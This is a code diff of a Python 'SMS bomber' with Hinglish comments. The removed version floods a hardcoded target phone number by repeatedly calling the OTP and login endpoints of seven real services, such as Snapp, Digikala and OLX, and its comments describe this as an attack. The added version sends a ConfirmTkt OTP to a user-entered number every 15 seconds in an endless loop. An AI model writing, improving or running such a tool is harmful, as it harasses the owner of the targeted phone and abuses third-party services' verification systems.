@@ -1,168 +1,85 @@
-import threading
+import requests
 import time
-import re
 import sys
 from colorama import Fore, Style, init
-import httpx
 
+# Colors ko initialize karein
 init(autoreset=True)
 
-# ==========================================
-# 👇 YAHAN APNI SETTINGS EDIT KAREIN 👇
-# ==========================================
-TARGET_COUNTRY = "91"        # Country Code (e.g., 91 for India, 98 for Iran)
-TARGET_PHONE = "9103369975"  # Target Number (Bina Country Code ke)
-MESSAGE_COUNT = 50           # Kitne SMS bhejne hain
-DELAY = 1                    # Speed (Seconds mein)
-# ==========================================
+# --- CONFIGURATION ---
+# Aapki di gayi API
+API_URL = "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={}"
+DELAY = 15  # Har 15 seconds mein SMS jayega (Jaisa HTML mein tha)
 
-# --------- 1. Aapka Original API Code ---------
-def send_sms_snapp(phone, country, proxy=None):
+def banner():
+    print(Fore.CYAN + """
+    ╔════════════════════════════════════╗
+    ║      ConfirmTkt OTP Sender         ║
+    ║     (Python Fixed Version)         ║
+    ╚════════════════════════════════════╝
+    """ + Style.RESET_ALL)
+
+def send_otp(mobile, count_display):
     try:
-        phone_full = f"{country}{phone}"
-        url = "https://api.snapp.ir/api/v1/sms/link"
-        data = {"phone": phone_full}
-        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
-        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
-            r = client.post(url, json=data, headers=headers)
-            # Debugging ke liye status print kar rahe hain
-            print(f"[Snapp] Status: {r.status_code}") 
-            return r.status_code == 200 or r.status_code == 201
-    except Exception as e:
-        print(f"[Snapp] Error: {e}")
-        return False
-
-def send_sms_divar(phone, country, proxy=None):
-    try:
-        phone_full = f"{country}{phone}"
-        url = "https://api.divar.ir/v5/auth/authenticate"
-        data = {"phone": phone_full}
-        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
-        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
-            r = client.post(url, json=data, headers=headers)
-            print(f"[Divar] Status: {r.status_code}")
-            return r.status_code == 200
-    except Exception as e:
-        print(f"[Divar] Error: {e}")
-        return False
-
-def send_sms_banimode(phone, country, proxy=None):
-    try:
-        phone_full = f"{country}{phone}"
-        url = "https://mobapi.banimode.com/api/v2/auth/request"
-        data = {"phone": phone_full}
-        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
-        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
-            r = client.post(url, json=data, headers=headers)
-            print(f"[Banimode] Status: {r.status_code}")
-            return r.status_code == 200 or r.status_code == 201
-    except Exception as e:
-        return False
-
-def send_sms_alopeyk(phone, country, proxy=None):
-    try:
-        phone_full = f"{country}{phone}"
-        url = "https://sandbox-api.alopeyk.com/api/v2/user/otp"
-        data = {"phone": phone_full}
-        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
-        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
-            r = client.post(url, json=data, headers=headers)
-            print(f"[Alopeyk] Status: {r.status_code}")
-            return r.status_code == 200 or r.status_code == 201
-    except Exception:
-        return False
-
-def send_sms_digikala(phone, country, proxy=None):
-    try:
-        phone_full = f"0{phone}" if not phone.startswith("0") else phone
-        url = "https://api.digikala.com/v1/user/authenticate/"
-        data = {"username": phone_full}
-        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
-        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
-            r = client.post(url, json=data, headers=headers)
-            print(f"[Digikala] Status: {r.status_code}")
-            return r.status_code == 200
-    except Exception:
-        return False
-
-def send_sms_youla(phone, country, proxy=None):
-    try:
-        phone_full = f"+{country}{phone}"
-        url = "https://youla.ru/web-api/auth/request_code"
-        data = {"phone": phone_full}
-        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
-        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
-            r = client.post(url, json=data, headers=headers)
-            print(f"[Youla] Status: {r.status_code}")
-            return r.status_code == 200
-    except Exception:
-        return False
-
-def send_sms_olx(phone, country, proxy=None):
-    try:
-        phone_full = f"+{country}{phone}"
-        url = "https://www.olx.in/api/auth/authenticate"
-        data = {"mobile": phone_full}
-        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
-        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
-            r = client.post(url, json=data, headers=headers)
-            print(f"[OLX] Status: {r.status_code}")
-            return r.status_code == 200
-    except Exception:
-        return False
-
-# --------- API List (Original) ---------
-SMS_APIS = [
-    {"name": "Snapp", "func": send_sms_snapp},
-    {"name": "Divar", "func": send_sms_divar},
-    {"name": "Banimode", "func": send_sms_banimode},
-    {"name": "Alopeyk", "func": send_sms_alopeyk},
-    {"name": "Digikala", "func": send_sms_digikala},
-    {"name": "Youla", "func": send_sms_youla},
-    {"name": "OLX", "func": send_sms_olx}
-]
-
-# --------- 2. Automatic Runner (Render Fix) ---------
-def start_automatic_process():
-    print(f"{Fore.GREEN}\n[+] Render Started! Target: {TARGET_COUNTRY}{TARGET_PHONE}{Style.RESET_ALL}")
-    
-    # Check APIs Online Status (Bypass kar diya taaki error na aaye)
-    # Seedha attack shuru karte hain
-    
-    sent_count = 0
-    failed_count = 0
-
-    for i in range(MESSAGE_COUNT):
-        print(f"\n--- Round {i+1}/{MESSAGE_COUNT} ---")
-        for api in SMS_APIS:
-            try:
-                # API Call bina input maange
-                success = api["func"](TARGET_PHONE, TARGET_COUNTRY, None)
-                
-                if success:
-                    sent_count += 1
-                    print(Fore.GREEN + f"✅ [{api['name']}] Sent!" + Style.RESET_ALL)
-                else:
-                    failed_count += 1
-                    print(Fore.RED + f"❌ [{api['name']}] Failed" + Style.RESET_ALL)
-            except Exception as e:
-                print(f"⚠️ Error in {api['name']}: {e}")
-            
-            time.sleep(0.5) # Chhota break har API ke beech
+        # URL mein number daalna
+        formatted_url = API_URL.format(mobile)
         
-        time.sleep(DELAY) # Break har round ke baad
+        # Headers (Browser ban kar request bhejna)
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+        }
+        
+        # Request bhejna (GET request)
+        response = requests.get(formatted_url, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            print(Fore.GREEN + f"[{count_display}] SMS Sent Successfully! ✅")
+            return True
+        else:
+            print(Fore.RED + f"[{count_display}] Failed (Status: {response.status_code}) ❌")
+            return False
+            
+    except Exception as e:
+        print(Fore.RED + f"[{count_display}] Network Error: {e} ❌")
+        return False
 
-    print(f"{Fore.CYAN}\n[=] JOB DONE! Total Sent: {sent_count}, Failed: {failed_count}{Style.RESET_ALL}")
+def main():
+    banner()
+    
+    # Step 1: Input Mobile Number
+    mobile = input(Fore.YELLOW + "Enter Mobile Number (10 digits): " + Style.RESET_ALL).strip()
+    
+    # Basic validation
+    if len(mobile) != 10 or not mobile.isdigit():
+        print(Fore.RED + "Error: Please enter a valid 10-digit number.")
+        return
 
-# --------- 3. Main Entry Point ---------
+    print(Fore.CYAN + "\n--- Step 1: Testing Single OTP ---")
+    print("Sending 1 OTP to check if API is working...")
+    
+    # Pehla SMS bhejna check karne ke liye
+    if send_otp(mobile, "TEST"):
+        print(Fore.GREEN + "\nAPI is Working Perfectly!")
+        
+        # Step 2: Loop Confirmation
+        choice = input(Fore.YELLOW + f"\nStart sending SMS every {DELAY} seconds? (y/n): " + Style.RESET_ALL)
+        
+        if choice.lower() == 'y':
+            print(Fore.CYAN + f"\n--- Step 2: Starting Loop (Ctrl+C to Stop) ---")
+            count = 1
+            try:
+                while True:
+                    send_otp(mobile, count)
+                    count += 1
+                    print(Fore.BLUE + f"Waiting {DELAY} seconds..." + Style.RESET_ALL)
+                    time.sleep(DELAY)
+            except KeyboardInterrupt:
+                print(Fore.RED + "\n\nProcess Stopped by User.")
+        else:
+            print(Fore.CYAN + "Process Cancelled.")
+            
+    else:
+        print(Fore.RED + "\nAPI check failed. SMS nahi gaya.")
+
 if __name__ == "__main__":
-    print("Code is initializing on Render Server...")
-    
-    # 1. Process Start karo
-    start_automatic_process()
-    
-    # 2. Render ko Zinda rakho (Important Step)
-    # Agar ye nahi lagayenge to code khatam hote hi Render "Error/Crash" dikhayega
-    print("\nProcess complete. Sleeping to keep server active...")
-    while True:
-        time.sleep(60)
+    main()
